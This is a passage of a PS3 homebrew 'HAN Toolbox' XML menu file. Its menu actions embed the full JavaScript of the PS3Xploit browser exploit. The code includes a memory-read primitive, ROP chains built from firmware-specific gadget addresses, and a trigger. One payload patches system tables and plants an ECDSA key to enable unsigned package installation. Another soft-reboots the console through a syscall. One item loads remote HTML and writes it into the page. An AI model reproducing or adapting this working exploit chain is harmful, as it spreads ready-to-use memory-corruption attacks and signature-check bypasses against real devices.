toc_entry5_addr=0x6EB690; gadget_mod1_addr=0x60E59C; gadget_mod8_addr=0x2BACB4; } else if (fwv=="4.82") { toc_addr=0x6F5550; vsh_ps3xploit_key_toc=0x707774; default_vsh_pub_toc=0x6ED5A4; toc_entry5_addr=0x6EB6C0; gadget_mod1_addr=0x60EF38; } else if (fwv=="4.83") { ipf1_addr=0x6ebb78; } else if (fwv=="4.84" || fwv=="4.85") { ipf1_addr=0x6ebb78; } else if (fwv>="4.86") { vsh_ps3xploit_key_toc=0x707A1C; toc_entry3_addr=0x6DA3C8; ipf1_addr=0x6EBB78; } function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\076\07616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\0470000\047+this).substr(-4)};String.prototype.toAscii=function(a){var b=\047\047;var i=0;while(i\074this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\0741){return\047\047}var b=\047\047;var c=\047\047;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}while(i\074b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\047\047)};String.prototype.convertedSize=function(a){if(this.length\0741){return 0}var b=\047\047;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\047\047,sign=this\0740?\047-\047:\047\047,str=a[0].replace(\047.\047,\047\047),mag=Number(a[1])+1;if(mag\0740){z=sign+\0470.\047;while(mag++){z+=\0470\047}return z+str.replace(/^\-/,\047\047)}mag-=str.length;while(mag--){z+=\0470\047}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\076\0761}}g.reverse();var k=g.join(\047\047);var l=(1\074\074(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\074\074b)-1){d=f!==0?NaN:s*Infinity}else if(e\0760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\076\07624)&0xFF,(a\076\07616)&0xFF,(a\076\0768)&0xFF,(a)&0xFF,(b\076\07624)&0xFF,(b\076\07616)&0xFF,(b\076\0768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\074\07432)|((b\076\0761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\047exploit\047)){document.getElementById(\047exploit\047).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\047exploit\047)){readMemory(a,b);if(debug===true){var x=document.getElementById(\047exploit\047).style.src.substr(6,c);return x}return document.getElementById(\047exploit\047).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\047trigger\047)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){var b=document.getElementById(\047auto_close\047);if(b){if(b.checked===true)window.close()}}function load_check(){if(total_loops\074max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\047exploit\047).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\074(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\074(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\074offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\\u4141\\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+ps3xploit_ecdsa_key.convert(true)+index_key.convert(true)+unescape("\\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\074search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}ps3xploit_ecdsa_key_addr=xtra_data_addr+start_x.convertedSize()-0x4;index_key_addr=ps3xploit_ecdsa_key_addr+ps3xploit_ecdsa_key.convertedSize(true);stack_frame=stack_frame_hookup()+store_word(toc_entry1_addr,vsh_opd_patch+4)+store_word(toc_entry3_addr,vsh_opd_patch+4)+store_word(toc_entry5_addr,vsh_opd_patch+4)+store_word(ipf1_addr,ipf2_addr)+store_word(default_vsh_pub_toc,vsh_ps3xploit_key_toc)+memcpy(vsh_ps3xploit_key_toc-0x20,index_key_addr,(index_key.length/2))+memcpy(vsh_ps3xploit_key_toc,ps3xploit_ecdsa_key_addr,(ps3xploit_ecdsa_key.length/2))+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\074search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\074search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\\u0102\\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\\uFB7E");while(jump_2_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\\u4141\\u7EFA")+hexw2bin(jump_2_addr)+unescape("\\uFA7E");while(jump_1_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){debug=true;debug=false}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
			</Table>
			<Table key="han_functions">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/han.png</String></Pair>
				<Pair key="title"><String>HAN Functions</String></Pair>
				<Pair key="info"><String>Online, Offline and Locally Hosted autorun HAN functions</String></Pair>
			</Table>
			<Table key="whats_new_browser">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/dadi590_whats_new_browser.png</String></Pair>
				<Pair key="title"><String>What's New on Browser</String></Pair>
				<Pair key="info"><String>Check the the most recent console jailbreaking news</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript: var news_code_URL = "https://raw.githubusercontent.com/DADi590/Console-news-on-consoles/master/PSX_Place/PS3/news_page_code.html"; function httpGet(url) { if (window.XMLHttpRequest) { xmlhttp = new XMLHttpRequest(); } else { xmlhttp = new ActiveXObject("Microsoft.XMLHTTP"); } xmlhttp.onreadystatechange = function() { if (xmlhttp.readyState == 4 && xmlhttp.status == 200) { document.write(""); document.write(xmlhttp.responseText); } }; try { xmlhttp.open("GET", url, true); xmlhttp.send(); } catch (err) { alert("This browser seems not to be compatible. Error: " + err); } } httpGet(news_code_URL);</String></Pair>
			</Table>
			<Table key="han_external_content">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/server.png</String></Pair>
				<Pair key="title"><String>External Content</String></Pair>
				<Pair key="info"><String>Download and install content from remote servers</String></Pair>
			</Table>
			<Table key="han_advanced_menu">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/setup.png</String></Pair>
				<Pair key="title"><String>Advanced Tools</String></Pair>
				<Pair key="info"><String>Be careful with items in here</String></Pair>
			</Table>
			<Table key="han_toolbox_setup">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/dadi590_settings.png</String></Pair>
				<Pair key="title"><String>Toolbox Settings</String></Pair>
				<Pair key="info"><String>Version info, Resources download, Updates, Languages</String></Pair>
			</Table>
		</Attributes>
		<Items>
			<Query 
				class="type:x-xmb/module-action"
				key="han_reboot_soft_offline"
				attr="han_reboot_soft_offline"
				/>
			<Query 
				class="type:x-xmb/module-action"
				key="han_debug_han_offline"
				attr="han_debug_han_offline"
				/>
			<Query 
				class="type:x-xmb/module-action"
				key="han_enabler_offline"
				attr="han_enabler_offline"
				/>
			<Query 
				class="type:x-xmb/folder-pixmap"
				key="han_functions"
				attr="han_functions"
				src="#han_functions_items"
				/>
			<Query 
				class="type:x-xmb/module-action"
				key="whats_new_browser"
				attr="whats_new_browser"
				/>
			<Query 
				class="type:x-xmb/folder-pixmap" 
				key="han_external_content" 
				attr="han_external_content"
				src="xmb://localhost/dev_hdd0/game/HANTOOLBX/USRDIR/XMLS/han_toolbox_external_content.xml#han_external_content_main"
				/>
			<Query 
				class="type:x-xmb/folder-pixmap" 
				key="han_advanced_menu" 
				attr="han_advanced_menu"
				src="xmb://localhost/dev_hdd0/game/HANTOOLBX/USRDIR/XMLS/han_toolbox_advanced_tools.xml#han_advanced_menu_main"
				/>
			<Query 
				class="type:x-xmb/folder-pixmap" 
				key="han_toolbox_setup" 
				attr="han_toolbox_setup"
				src="xmb://localhost/dev_hdd0/game/HANTOOLBX/USRDIR/XMLS/han_toolbox_settings.xml#han_toolbox_setup_main"
				/>
		</Items>
	</View>
		
	<View id="han_functions_items">
		<Attributes>
			<Table key="han_functions_offline">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/han.png</String></Pair>
				<Pair key="title"><String>HAN Functions (Offline)</String></Pair>
				<Pair key="info"><String>Autorun HAN functions (Offline)</String></Pair>
			</Table>
			<Table key="han_functions_online">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/han.png</String></Pair>
				<Pair key="title"><String>HAN Functions (Online)</String></Pair>
				<Pair key="info"><String>Autorun HAN functions (online)</String></Pair>
			</Table>
			<Table key="han_functions_local">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/han.png</String></Pair>
				<Pair key="title"><String>HAN Functions (Locally Hosted)</String></Pair>
				<Pair key="info"><String>Autorun HAN functions (Locally hosted via PKG Linker)</String></Pair>
			</Table>
		</Attributes>
		<Items>
			<Query 
				class="type:x-xmb/folder-pixmap" 
				key="han_functions_offline" 
				attr="han_functions_offline"
				src="xmb://localhost/dev_hdd0/game/HANTOOLBX/USRDIR/XMLS/han_toolbox_han_functions_offline.xml#han_functions_main_offline"
				/>
			<Query 
				class="type:x-xmb/folder-pixmap" 
				key="han_functions_online" 
				attr="han_functions_online"
				src="xmb://localhost/dev_hdd0/game/HANTOOLBX/USRDIR/XMLS/han_toolbox_han_functions_online.xml#han_functions_main_online"
				/>
			<Query 
				class="type:x-xmb/folder-pixmap" 
				key="han_functions_local" 
				attr="han_functions_local"
				src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/local_ps3xploit.xml#han_functions_local_items"
				/>
		</Items>
	</View>
		
<!-- Main Items DEX (here : icon update notification) -->
		
	<View id="han_main_items_dex">
		<Attributes>
			<Table key="han_reboot_soft_offline_dex">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/reboot.png</String></Pair>
				<Pair key="title"><String>Offline Soft Rebooter</String></Pair>
				<Pair key="info"><String>Restart console</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2 * mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,hr="\074hr\076",sc_sm_shutdown=0x17B,soft_reboot=0x200,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (") + 19,ua.indexOf(") Apple"));document.write(\047\074html\076\074head\076\074title\076PS3Xploit - Offline Soft Rebooter by lmn7\074/title\076\074/head\076\074body id="bodyId" style="background-color:#FFFFFF"\076\074div id="headerId"\076\074h1\076Soft Rebooting...\074/h1\076\074span id="hideme" style="visibility:hidden"\076\074p\076\074button id="btnROP" type="button" onclick="initROP(true);" autofocus\076Initialize\074/button\076 | Close \074input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/\076\074span id="dex_txt" style="visibility:hidden"\076\074input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/\076\074/span\076\074/p\076\074p\076\074button id="btnTrigger" disabled="" type="button" onclick="triggerX();"\076En\074/button\076\074span id="reset" style="visibility:hidden"\076 | \074button id="btnReset" type="button" onclick="disable_trigger();"\076Reset\074/button\076\074/span\076\074/p\076\074/span\076\074div id="exploit" \076\074/div\076\074div id="trigger"\076\074/div\076\074/body\076\074/html\076\047); var toc_addr = 0x705610, gadget1_addr=0x0976BC, gadget8_addr=0x0200B4, gadget12_addr=0x0CD640, gadget_mod1_addr=0x6161B8, gadget_mod2_addr=0x013B74, gadget_mod3_addr=0x0B8EB8, gadget_mod4a_addr=0x0DEBD8, gadget_mod7_addr=0x01A6AC, gadget_mod8_addr=0x2C24E0; if (fwv == "4.81") { gadget_mod8_addr=0x2C24DC; } else if (fwv == "4.82") { toc_addr = 0x705640; gadget_mod1_addr=0x616B54; } else if (fwv == "4.84") { toc_addr = 0x705648; gadget_mod1_addr=0x616BF4; } function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\076\07616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\0470000\047+this).substr(-4)};String.prototype.toAscii=function(a){var b=\047\047;var i=0;while(i\074this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\0741){return\047\047}var b=\047\047;var c=\047\047;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}while(i\074b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\047\047)};String.prototype.convertedSize=function(a){if(this.length\0741){return 0}var b=\047\047;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\047\047,sign=this\0740?\047-\047:\047\047,str=a[0].replace(\047.\047,\047\047),mag=Number(a[1])+1;if(mag\0740){z=sign+\0470.\047;while(mag++){z+=\0470\047}return z+str.replace(/^\-/,\047\047)}mag-=str.length;while(mag--){z+=\0470\047}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\076\0761}}g.reverse();var k=g.join(\047\047);var l=(1\074\074(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\074\074b)-1){d=f!==0?NaN:s*Infinity}else if(e\0760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\076\07624)&0xFF,(a\076\07616)&0xFF,(a\076\0768)&0xFF,(a)&0xFF,(b\076\07624)&0xFF,(b\076\07616)&0xFF,(b\076\0768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\074\07432)|((b\076\0761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\047exploit\047)){document.getElementById(\047exploit\047).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\047exploit\047)){readMemory(a,b);if(debug===true){var x=document.getElementById(\047exploit\047).style.src.substr(6,c);return x}return document.getElementById(\047exploit\047).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\047trigger\047)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){var b=document.getElementById(\047auto_close\047);if(b){if(b.checked===true)window.close()}}function load_check(){if(total_loops\074max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\047exploit\047).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\074(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\074(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\074offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\\u4141\\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+unescape("\\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\074search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}stack_frame=stack_frame_hookup()+callsub(gadget12_addr,2,0,0,0,0,0,0,0,0,0x80)+syscall(sc_sm_shutdown,soft_reboot,0,0,0,0,0,0,0)+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\074search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\074search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\\u0102\\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\\uFB7E");while(jump_2_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\\u4141\\u7EFA")+hexw2bin(jump_2_addr)+unescape("\\uFA7E");while(jump_1_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){debug=true;debug=false}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
			</Table>
			<Table key="han_debug_han_offline_dex">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/dadi590_debug_han_enabler.png</String></Pair>
				<Pair key="title"><String>Offline Debug Packages and (partial) HAN Enabler</String></Pair>
				<Pair key="info"><String>Enable installation of modified retail packages and running of HAN licensed games</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
